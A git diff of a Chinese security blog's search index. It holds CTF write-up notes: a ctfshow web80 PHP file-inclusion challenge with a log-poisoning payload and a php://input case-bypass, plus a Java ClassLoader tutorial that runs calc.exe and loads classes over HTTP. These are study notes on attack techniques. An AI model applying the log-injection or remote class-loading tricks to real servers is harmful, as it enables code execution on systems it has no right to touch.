-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web80题目</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="comment">//没有对输入进行限制和处理所以此处我们可以通过大小写绕过；</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p>传输后发现日志中记载的是UA头，所以可以通过bp再UA头中构造语句获得flag</p>
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220724161603151.png" class="" title="image-20220724161603151">
-
-<p>先查看文件</p>
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220724163900808.png" class="" title="image-20220724163900808">
-
-<p>获取flag（至于这里为甚么用base64有点不明白，猜测：可能文件使用的是base64加密吧，不过使用vi和vim也可以获得flag）</p>
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220724164056572.png" class="" title="image-20220724164056572">
-
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220724164233173.png" class="" title="image-20220724164233173">
-
-<p>（两道题都可以使用这种日志包含的思路web81的具体过程就不在此具体赘述）</p>
-<h2 id="web80的第二种解法（php：-x2F-x2F-input）"><a href="#web80的第二种解法（php：-x2F-x2F-input）" class="headerlink" title="web80的第二种解法（php：&#x2F;&#x2F;input）"></a>web80的第二种解法（php：&#x2F;&#x2F;input）</h2><p>正如代码中注释所说我们可以利用大小写绕过后使用input协议，通过post传值进行命令执行</p>
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220725202045975.png" class="" title="image-20220725202045975">
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>刷题</category>
         <category>ctfshow刷题</category>
       </categories>
       <tags>
@@ -2364,11 +2364,12 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level1</title>
-    <url>/2022/06/08/embryoio-level1/</url>
+    <title>embryoio level2</title>
+    <url>/2022/06/08/embryoio-level2/</url>
     <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
-<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level2/level2-1.png" alt="屏幕截图 2022-06-07 120319"></p>
+<p>可以看到程序让我们输入一个简单的密码，我们先随便输入个数据，然后看到程序说我们的密码是错的，正确的密码就在括号里。所以我们再次运行程序，输入正确的密码，就得到了flag，具体操作如下图所示。</p>
+<p><img src="/2022/06/08/embryoio-level2/level2-2.png" alt="屏幕截图 2022-06-07 121423"></p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -2379,12 +2380,11 @@
       </tags>
   </entry>
   <entry>
-    <title>embryoio level2</title>
-    <url>/2022/06/08/embryoio-level2/</url>
+    <title>embryoio level1</title>
+    <url>/2022/06/08/embryoio-level1/</url>
     <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level2/level2-1.png" alt="屏幕截图 2022-06-07 120319"></p>
-<p>可以看到程序让我们输入一个简单的密码，我们先随便输入个数据，然后看到程序说我们的密码是错的，正确的密码就在括号里。所以我们再次运行程序，输入正确的密码，就得到了flag，具体操作如下图所示。</p>
-<p><img src="/2022/06/08/embryoio-level2/level2-2.png" alt="屏幕截图 2022-06-07 121423"></p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
+<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -2531,6 +2531,91 @@
       </tags>
   </entry>
   <entry>
+    <title>java类加载器</title>
+    <url>/2023/03/27/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
+    <content><![CDATA[<h1 id="java基础学习"><a href="#java基础学习" class="headerlink" title="java基础学习"></a>java基础学习</h1><h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><p>java程序的运行是一个有意思的过程</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318171149207.png" alt="image-20230318171149207"></p>
+<p>编译过程实在JVM（java虚拟机）中完成的我们在IDE中编写的Java源代码被编译器编译成**.class**的字节码文件。然后由我们得ClassLoader负责将这些class文件给加载到JVM中去执行；这里使用一张完整的图片</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318171402189.png" alt="image-20230318171402189"></p>
+<h3 id="类加载器（ClassLoader）"><a href="#类加载器（ClassLoader）" class="headerlink" title="类加载器（ClassLoader）"></a>类加载器（ClassLoader）</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。</p>
+<h4 id="类加载器的分类"><a href="#类加载器的分类" class="headerlink" title="类加载器的分类"></a>类加载器的分类</h4><p>类加载器大致分为两种，一种是JVM自带的类加载器，另一种则是用户自定义的类加载器；其中JVM自带的类加载器又分别为引导类加载器、扩展类加载器和系统类加载器。另外一种就是用户自定义的类加载器，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p>
+<h3 id="JVM自带的类加载器"><a href="#JVM自带的类加载器" class="headerlink" title="JVM自带的类加载器"></a>JVM自带的类加载器</h3><h5 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h5><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，<strong>不继承java.lang.ClassLoader类</strong>，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p>
+<p>这里以jdk1.8为例，这里我们看到&#x2F;jre&#x2F;lib&#x2F;rt.jar目录，这里面的类都是由BootstrapClassLoader来加载。</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318163432328.png" alt="image-20230318163432328"></p>
+<p>Object类是java中的一个特殊类，也是所有类的父类，也就是说，Java 允许把任何类型的对象赋给 Object 类型的变量。当一个类被定义后，如果没有指定继承的父类，那么默认父类就是 Object 类；我们这里以object为测试看一看其是否存在父加载器</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318163858272.png" alt="image-20230318163858272"></p>
+<p>我们可以看出object的父类加载器为null；</p>
+<h5 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h5><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p>
+<p>根据描述在<code>C:\Program Files\Java\jre1.8.0_331\lib\ext</code>目录下的jar包都是由ExtensionsClassLoader进行加载</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318164901711.png" alt="image-20230318164901711"></p>
+<p>我们随机选一个上图中的jar包然后产看其中类加载器（此处以sunec.SunEC为例）</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318165420568.png" alt="image-20230318165420568"></p>
+<p>我们可以看到其类加载器为ExtensionsClassLoader；</p>
+<h5 id="App类记载器-x2F-系统类加载器（AppClassLoader）"><a href="#App类记载器-x2F-系统类加载器（AppClassLoader）" class="headerlink" title="App类记载器&#x2F;系统类加载器（AppClassLoader）"></a>App类记载器&#x2F;系统类加载器（AppClassLoader）</h5><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。</p>
+<p>这里我们使用本身写的ClassLoaderTest类进行测试，发现存在于AppClassLoader。</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318165839723.png" alt="image-20230318165839723"></p>
+<h5 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h5><p>它们之间的层次关系被称为类加载器的双亲委派模型</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318173021571.png" alt="image-20230318173021571"></p>
+<p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。（言简意赅的说就是先找爹，爹不行再靠自己，找父类的顺序如上图所示）</p>
+<h5 id="双亲委派机制的好处"><a href="#双亲委派机制的好处" class="headerlink" title="双亲委派机制的好处"></a>双亲委派机制的好处</h5><p>1、避免重复加载</p>
+<p>2、保证java核心库的类型安全 ；例如我们上传一个Object类，因为双亲委派机制的存在通过父类的识别，子类中的Object类将不会被加载，保证我们的java核心API库不被篡改；</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230319172417359.png" alt="image-20230319172417359"></p>
+<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>在进入自定义类加载器之前我们先看一下ClassLoaer类中的核心方法</p>
+<h4 id="ClassLoader类的核心方法"><a href="#ClassLoader类的核心方法" class="headerlink" title="ClassLoader类的核心方法"></a>ClassLoader类的核心方法</h4><h5 id="loadclasss-加载指定的java类"><a href="#loadclasss-加载指定的java类" class="headerlink" title="loadclasss(加载指定的java类)"></a>loadclasss(加载指定的java类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>); </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123; </span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="findclass-查找指定的Java类"><a href="#findclass-查找指定的Java类" class="headerlink" title="findclass(查找指定的Java类)"></a>findclass(查找指定的Java类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="findLoadedClass-查找JVM已经加载过的类"><a href="#findLoadedClass-查找JVM已经加载过的类" class="headerlink" title="findLoadedClass(查找JVM已经加载过的类)"></a>findLoadedClass(查找JVM已经加载过的类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> &#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="自定义类加载器-1"><a href="#自定义类加载器-1" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><p>在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式</p>
+<p>自定义类加载器步骤：</p>
+<ul>
+<li>继承classloader类</li>
+<li>覆盖findclass()方法</li>
+<li>在findClass()方法中调用defineClass()方法</li>
+</ul>
+<h5 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h5><p>URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。</p>
+<p>我们在创建了一个Main.java文件，写了一段calc.exe计算机弹窗代码。如果文件被成功解析执行，会输出Test calc success！！！字段且弹出计算器。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test calc success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们利用javac编译生成对应的.class文件</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230319235739048.png" alt="image-20230319235739048"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\Javaeeworkspce\\javasecurity\\src\\main\\java\\org\\example&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;org.example.Main&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看出成功的弹出了计算器</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230320000050159.png" alt="image-20230320000050159"></p>
+<h5 id="网络传输class文件调用"><a href="#网络传输class文件调用" class="headerlink" title="网络传输class文件调用"></a>网络传输class文件调用</h5><p>我们将Test.class放置到电脑的Tomcat服务器目录下(tomcat&#x2F;webapps&#x2F;),然后新建个ClassLoaderTest类网络加载Tomcat服务器中的Main.class</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8080/examples/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;org.example.Main&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Main.java中还有一段输出Test calc success!!!这里截图失误了</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230320001511079.png" alt="image-20230320001511079"></p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/luckforefforts/p/13642685.html">java中双亲委派机制(+总结） - luwanglin - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://xz.aliyun.com/t/9002#toc-9">JAVA安全基础（一）–类加载器（ClassLoader） - 先知社区 (aliyun.com)</a></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>web笔记</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反射机制</title>
     <url>/2023/03/27/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p><strong>tips:学习过程中一定要注意一个关键词动态，这是其存在的重要原因，即通过反射我们可以将java这种静态语言附加上动态特性</strong></p>
@@ -2665,88 +2750,51 @@
       </tags>
   </entry>
   <entry>
-    <title>java类加载器</title>
-    <url>/2023/03/27/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
-    <content><![CDATA[<h1 id="java基础学习"><a href="#java基础学习" class="headerlink" title="java基础学习"></a>java基础学习</h1><h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><p>java程序的运行是一个有意思的过程</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318171149207.png" alt="image-20230318171149207"></p>
-<p>编译过程实在JVM（java虚拟机）中完成的我们在IDE中编写的Java源代码被编译器编译成**.class**的字节码文件。然后由我们得ClassLoader负责将这些class文件给加载到JVM中去执行；这里使用一张完整的图片</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318171402189.png" alt="image-20230318171402189"></p>
-<h3 id="类加载器（ClassLoader）"><a href="#类加载器（ClassLoader）" class="headerlink" title="类加载器（ClassLoader）"></a>类加载器（ClassLoader）</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。</p>
-<h4 id="类加载器的分类"><a href="#类加载器的分类" class="headerlink" title="类加载器的分类"></a>类加载器的分类</h4><p>类加载器大致分为两种，一种是JVM自带的类加载器，另一种则是用户自定义的类加载器；其中JVM自带的类加载器又分别为引导类加载器、扩展类加载器和系统类加载器。另外一种就是用户自定义的类加载器，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p>
-<h3 id="JVM自带的类加载器"><a href="#JVM自带的类加载器" class="headerlink" title="JVM自带的类加载器"></a>JVM自带的类加载器</h3><h5 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h5><p>引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，<strong>不继承java.lang.ClassLoader类</strong>，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在&#x2F;jre&#x2F;lib&#x2F;rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p>
-<p>这里以jdk1.8为例，这里我们看到&#x2F;jre&#x2F;lib&#x2F;rt.jar目录，这里面的类都是由BootstrapClassLoader来加载。</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318163432328.png" alt="image-20230318163432328"></p>
-<p>Object类是java中的一个特殊类，也是所有类的父类，也就是说，Java 允许把任何类型的对象赋给 Object 类型的变量。当一个类被定义后，如果没有指定继承的父类，那么默认父类就是 Object 类；我们这里以object为测试看一看其是否存在父加载器</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318163858272.png" alt="image-20230318163858272"></p>
-<p>我们可以看出object的父类加载器为null；</p>
-<h5 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h5><p>扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p>
-<p>根据描述在<code>C:\Program Files\Java\jre1.8.0_331\lib\ext</code>目录下的jar包都是由ExtensionsClassLoader进行加载</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318164901711.png" alt="image-20230318164901711"></p>
-<p>我们随机选一个上图中的jar包然后产看其中类加载器（此处以sunec.SunEC为例）</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318165420568.png" alt="image-20230318165420568"></p>
-<p>我们可以看到其类加载器为ExtensionsClassLoader；</p>
-<h5 id="App类记载器-x2F-系统类加载器（AppClassLoader）"><a href="#App类记载器-x2F-系统类加载器（AppClassLoader）" class="headerlink" title="App类记载器&#x2F;系统类加载器（AppClassLoader）"></a>App类记载器&#x2F;系统类加载器（AppClassLoader）</h5><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。</p>
-<p>这里我们使用本身写的ClassLoaderTest类进行测试，发现存在于AppClassLoader。</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318165839723.png" alt="image-20230318165839723"></p>
-<h5 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h5><p>它们之间的层次关系被称为类加载器的双亲委派模型</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230318173021571.png" alt="image-20230318173021571"></p>
-<p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。（言简意赅的说就是先找爹，爹不行再靠自己，找父类的顺序如上图所示）</p>
-<h5 id="双亲委派机制的好处"><a href="#双亲委派机制的好处" class="headerlink" title="双亲委派机制的好处"></a>双亲委派机制的好处</h5><p>1、避免重复加载</p>
-<p>2、保证java核心库的类型安全 ；例如我们上传一个Object类，因为双亲委派机制的存在通过父类的识别，子类中的Object类将不会被加载，保证我们的java核心API库不被篡改；</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230319172417359.png" alt="image-20230319172417359"></p>
-<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>在进入自定义类加载器之前我们先看一下ClassLoaer类中的核心方法</p>
-<h4 id="ClassLoader类的核心方法"><a href="#ClassLoader类的核心方法" class="headerlink" title="ClassLoader类的核心方法"></a>ClassLoader类的核心方法</h4><h5 id="loadclasss-加载指定的java类"><a href="#loadclasss-加载指定的java类" class="headerlink" title="loadclasss(加载指定的java类)"></a>loadclasss(加载指定的java类)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            